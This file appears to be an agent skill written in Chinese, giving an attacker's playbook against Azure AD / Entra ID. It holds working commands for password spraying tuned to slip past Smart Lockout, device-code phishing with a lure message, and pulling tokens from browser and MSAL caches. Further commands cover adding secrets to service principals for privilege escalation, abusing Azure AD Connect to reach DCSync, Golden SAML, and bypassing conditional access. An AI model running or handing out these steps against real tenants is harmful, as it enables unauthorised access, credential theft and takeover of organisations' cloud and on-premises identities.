---
name: azure-ad-attack
description: "Azure AD / Entra ID 攻击方法论。当目标使用 Microsoft 365/Azure 云环境、发现 Azure AD 认证流程、或获取到 Azure 凭据时使用。覆盖初始访问（Password Spray/Phishing）、令牌窃取、Service Principal 滥用、条件访问绕过、跨租户攻击"
metadata:
  tags: "azure,entra,aad,microsoft365,token,service-principal,conditional-access,云攻击,Azure AD"
  category: "cloud"
  mitre_attack: "T1078.004,T1528,T1550.001,T1098.001"
---

# Azure AD / Entra ID 攻击方法论

> **定位**：从攻击者视角利用 Azure AD 的信任关系、令牌机制和配置缺陷实现横向移动和权限提升

## ⛔ 深入参考

- Token 窃取与刷新攻击详细流程 → [references/token-attacks.md](references/token-attacks.md)
- Service Principal 与应用注册滥用 → [references/app-abuse.md](references/app-abuse.md)

---

## Phase 1: 初始访问

### 1.1 Password Spray（Azure AD）

```bash
# MSOLSpray — Azure AD 密码喷洒
python3 MSOLSpray.py --userlist users.txt --password 'Spring2024!' \
  --url https://login.microsoftonline.com

# Ruler — Exchange/O365 密码喷洒
ruler --domain target.com brute --users users.txt --passwords pass.txt

# Trevorspray — 分布式喷洒（绕过 Smart Lockout）
trevorspray --users users.txt --passwords passwords.txt \
  --url https://login.microsoftonline.com \
  --delay 30 --jitter 10

# ⛔ Azure AD Smart Lockout: 默认 10 次失败/60s
# 策略: 每用户 1-2 次尝试，间隔 > 60s，使用不同 IP
```

### 1.2 Phishing（Device Code / Consent Grant）

```bash
# Device Code Phishing — 不需要目标输入密码
# 1. 获取 device code
curl -X POST https://login.microsoftonline.com/common/oauth2/devicecode \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.microsoft.com"

# 2. 发送 device code 给目标（通过钓鱼邮件）
# "请访问 https://microsoft.com/devicelogin 并输入代码: XXXXXXXXX"

# 3. 目标输入代码后，攻击者获取令牌
curl -X POST https://login.microsoftonline.com/common/oauth2/token \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&code=DEVICE_CODE"
```

### 1.3 Token 提取（已控主机）

```bash
# 从浏览器提取 Azure AD Cookie/Token
# Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
# Edge: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies

# 从 TokenCache 提取
# Windows: %LOCALAPPDATA%\.IdentityService\msal.cache
# macOS: ~/Library/Group Containers/*.Office/MicrosoftRegistrationDB.reg

# 使用 AADInternals
Import-Module AADInternals
Get-AADIntAccessTokenForMSGraph  # 获取 Graph API token
```

## Phase 2: 枚举与信息收集

```bash
# AzureHound — BloodHound 的 Azure 版本
azurehound list -u user@target.com -p 'password' --tenant target.onmicrosoft.com -o output.json

# ROADtools — Azure AD 完整枚举
roadrecon auth -u user@target.com -p 'password'
roadrecon gather
roadrecon gui  # Web UI 浏览结果

# Microsoft Graph API 枚举
# 用户列表
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users?\$select=displayName,userPrincipalName,accountEnabled"

# 组成员
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/groups?\$filter=displayName eq 'Global Admins'&\$expand=members"

# 应用注册
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/applications"

# Service Principals
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals"
```

## Phase 3: 权限提升

### 3.1 Service Principal 密钥添加

```bash
# 如果有权限给 Application 添加凭据
# Application.ReadWrite.All 或 Application 的 Owner

# 添加 Password Credential
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/applications/{app-id}/addPassword" \
  -d '{"passwordCredential":{"displayName":"backup"}}'

# 使用新密码以 Service Principal 身份登录
curl -X POST "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token" \
  -d "client_id={app-id}&client_secret={new-secret}&scope=https://graph.microsoft.com/.default&grant_type=client_credentials"
```

### 3.2 Consent Grant 攻击

```bash
# 创建恶意应用 → 诱骗管理员授予高权限
# 如果有 Application Administrator 角色：
# 直接给应用授予 admin consent

# 检查已有高权限应用
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/oauth2PermissionGrants?\$filter=consentType eq 'AllPrincipals'"
```

### 3.3 PIM (Privileged Identity Management) 激活

```bash
# 如果用户有 eligible 角色但未激活
# 使用 AADInternals 或 Graph API 激活

# 列出可激活的角色
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/beta/roleManagement/directory/roleEligibilityScheduleRequests"
```

## Phase 4: 横向移动

### Azure → On-Premises

```
Azure AD Connect 同步账户:
├─ MSOL_<installationID> — 拥有域中 DCSync 权限
├─ 获取 Azure AD Connect 配置数据库中的凭据
├─ 使用 AADInternals: Get-AADIntSyncCredentials
└─ 用该凭据 DCSync 整个域

Pass-the-PRT (Primary Refresh Token):
├─ 从已 Azure AD Join 的设备提取 PRT
├─ 使用 PRT 访问所有 Azure AD SSO 资源
├─ 工具: ROADtoken, RequestAADRefreshToken
└─ 可绕过条件访问策略（已信任设备）
```

### On-Premises → Azure

```
如果拥有 On-Prem 的 Azure AD Connect 服务器:
├─ 提取 MSOL 凭据 → 可修改任何 synced 用户的密码
├─ 通过 ADSync 数据库获取云管理员密码
└─ Golden SAML: 控制 AD FS → 伪造任何用户的 SAML token
```

## Phase 5: 条件访问绕过

```
常见绕过方式：
├─ Device Code 流程 — 某些策略不覆盖 device flow
├─ Legacy Authentication — 旧协议可能不受 CA 限制
├─ 不同 Client ID — 使用非浏览器客户端（Azure CLI/PowerShell）
├─ Trusted Location 滥用 — 如果从已信任 IP 访问
└─ 合规设备伪造 — PRT 中的设备声明
```

## 工具速查

| 工具 | 用途 |
|------|------|
| AzureHound | Azure AD 攻击路径发现 |
| ROADtools | 完整 Azure AD 枚举 |
| AADInternals | Azure AD 利用框架 |
| TokenTactics | Token 操作与刷新 |
| MSOLSpray | 密码喷洒 |
| GraphRunner | Graph API 交互 |
| Trevorspray | 分布式喷洒 |
